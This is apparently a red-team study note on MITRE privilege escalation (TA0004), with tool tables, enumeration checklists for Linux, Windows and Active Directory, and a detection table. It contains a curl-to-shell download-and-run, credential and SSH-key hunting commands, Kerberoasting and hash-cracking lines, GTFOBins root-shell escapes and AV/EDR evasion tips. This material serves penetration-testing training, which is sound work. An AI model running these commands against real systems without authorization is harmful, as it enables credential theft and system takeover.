---
type: tactic-hub
room: red
tactic: "Privilege Escalation"
tactic_id: "TA0004"
tags: [red/privesc, mitre/TA0004]
date_updated: {{date}}
---

# TA0004 — Privilege Escalation

> [!quote]
> *"A man should keep his little brain attic stocked with all the furniture that he is likely to use."*
> — *The Five Orange Pips*

**MITRE Reference:** [TA0004](https://attack.mitre.org/tactics/TA0004/) | **Kill Chain Phase:** Post-exploitation

The adversary is trying to gain higher-level permissions. You are inside, but you are a tenant, not the landlord. Privilege escalation is the art of picking the internal locks — from low-privileged shell to SYSTEM, root, or domain admin.

---

## Techniques in This Tactic

| Technique ID | Name | OS |
|-------------|------|-----|
| [[T1548 - Abuse Elevation Control Mechanism]] | Abuse Elevation Control (SUID/sudo/UAC) | Linux, Windows |
| [[T1134 - Access Token Manipulation]] | Access Token Manipulation | Windows |
| [[T1098 - Account Manipulation]] | Account Manipulation | All |
| [[T1547 - Boot or Logon Autostart Execution]] | Boot or Logon Autostart | All |
| [[T1543 - Create or Modify System Process]] | Create/Modify System Process | All |
| [[T1611 - Escape to Host]] | Escape to Host (Container) | Linux |
| [[T1068 - Exploitation for Privilege Escalation]] | Exploitation for PrivEsc | All |
| [[T1574 - Hijack Execution Flow]] | Hijack Execution Flow (DLL) | Windows |
| [[T1055 - Process Injection]] | Process Injection | Windows |
| [[T1053 - Scheduled Task / Job]] | Scheduled Task / Cron | All |
| [[T1078 - Valid Accounts]] | Valid Accounts (local admin reuse) | All |

---

## The Standard Kit *(Tools)*

| Tool | Role | Platform |
|------|------|---------|
| `linpeas.sh` | Automated Linux PrivEsc enumeration | Linux |
| `winpeas.exe` | Automated Windows PrivEsc enumeration | Windows |
| `linux-exploit-suggester` | Kernel exploit suggestions | Linux |
| `wesng` | Windows Exploit Suggester Next Gen | Windows |
| `bloodhound` / `sharphound` | AD attack path discovery | Windows / AD |
| `pspy` | Process monitoring (no root) | Linux |
| `sudo -l` | Sudo rights enumeration | Linux |
| `accesschk.exe` | Service / file ACL audit | Windows |
| `powerup.ps1` | Windows service/registry misconfig | Windows |

---

## Standard PrivEsc Workflows

### Linux PrivEsc Checklist

```bash
# ===== AUTOMATED =====
# Transfer and run linpeas
curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh | tee /tmp/linpeas.out

# ===== MANUAL ENUMERATION =====

# Who am I, and what groups?
id && whoami && groups

# Sudo rights
sudo -l

# SUID binaries (cross-ref GTFOBins)
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null  # SGID

# World-writable files and directories
find / -writable -type f 2>/dev/null | grep -v proc

# Capabilities
/sbin/getcap -r / 2>/dev/null

# Cron jobs
cat /etc/crontab
ls -la /etc/cron.*
cat /var/spool/cron/crontabs/root 2>/dev/null
pspy64  # runtime process spy — no root needed

# PATH hijacking check
echo $PATH
# Look for writable directories in PATH

# NFS misconfiguration
cat /etc/exports
showmount -e <ip>

# Readable /etc/shadow or ssh keys
ls -la /etc/shadow /etc/passwd
find / -name "id_rsa" -o -name "*.pem" 2>/dev/null

# Kernel version → exploit suggester
uname -a
/path/to/linux-exploit-suggester.sh

# Interesting files
find / -name "*.conf" -o -name "*.bak" -o -name "*.log" 2>/dev/null | xargs grep -l "password" 2>/dev/null
```

### Windows PrivEsc Checklist

```powershell
# ===== AUTOMATED =====
# Transfer and run winpeas
.\winpeas.exe > C:\Temp\winpeas.txt

# PowerUp
. .\PowerUp.ps1; Invoke-AllChecks | Out-File C:\Temp\powerup.txt

# ===== MANUAL ENUMERATION =====

# System info
systeminfo
whoami /all
net user
net localgroup administrators

# Unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"

# Weak service permissions
sc qc <service_name>
.\accesschk.exe /accepteula -uwcqv "Authenticated Users" *

# AlwaysInstallElevated (if both keys = 1 → exploit)
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Stored credentials
cmdkey /list
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

# DLL hijacking — look for missing DLLs in writable dirs
.\procmon.exe  # (in lab) filter for NAME NOT FOUND + .dll

# Kernel exploit check
systeminfo | python wesng.py --stdin
```

### Active Directory PrivEsc

```bash
# From Linux — BloodHound ingestion
bloodhound-python -u <user> -p <pass> -d <domain> -c All --zip

# From Windows — SharpHound
.\SharpHound.exe -c All --zipfilename bh-data.zip

# Common AD privesc paths to look for in BloodHound:
# - GenericAll / GenericWrite on object
# - WriteDACL / WriteOwner
# - DCSync rights (GetChanges + GetChangesAll)
# - Kerberoastable accounts (SPN set, weak password)
# - ASREPRoastable accounts (no preauth required)

# Kerberoasting
GetUserSPNs.py <domain>/<user>:<pass> -dc-ip <dc_ip> -request -outputfile kerberoast.txt
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt

# ASREPRoasting
GetNPUsers.py <domain>/ -usersfile users.txt -no-pass -dc-ip <dc_ip> -outputfile asrep.txt
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
```

---

## GTFOBins Quick Reference

> [!tip] GTFOBins
> For any SUID binary or sudo-allowed command, check [gtfobins.github.io](https://gtfobins.github.io) immediately.

```bash
# Example: sudo find → shell
sudo find . -exec /bin/sh \; -quit

# Example: SUID python3
python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# Example: sudo vim
sudo vim -c ':!/bin/bash'
```

---

## OPSEC Considerations

> [!warning] Leave No Trace
> - `linpeas` and `winpeas` are **very loud** — AV/EDR will flag them; use with caution in real engagements.
> - Writing to `/tmp` is expected; writing to sensitive paths is not.
> - Kernel exploits are last resort — they can crash the system.
> - BloodHound ingestion generates heavy LDAP traffic — stagger collection.

---

## What Blue Sees

| Activity | Log Source | Event / Indicator |
|----------|-----------|-------------------|
| SUID abuse | auditd | `execve` syscall on SUID binary |
| Sudo misuse | `/var/log/auth.log` | `sudo` entries for unexpected commands |
| Token impersonation | Windows Security | Event 4624 logon type 9 |
| Service modification | Windows System | Event 7045 (new service installed) |
| Kerberoasting | DC Security | Event 4769 (Kerberos ticket request for service) |

---

## Related Notes

- [[TA0001 - Initial Access]] ← Feeds into this
- [[TA0008 - Lateral Movement]] ← What comes after
- [[TA0003 - Persistence]] ← Often done alongside
- [[Red - Instruments]]

↩ [[Red - Notes]] · [[Red]] · [[Mind Palace]]
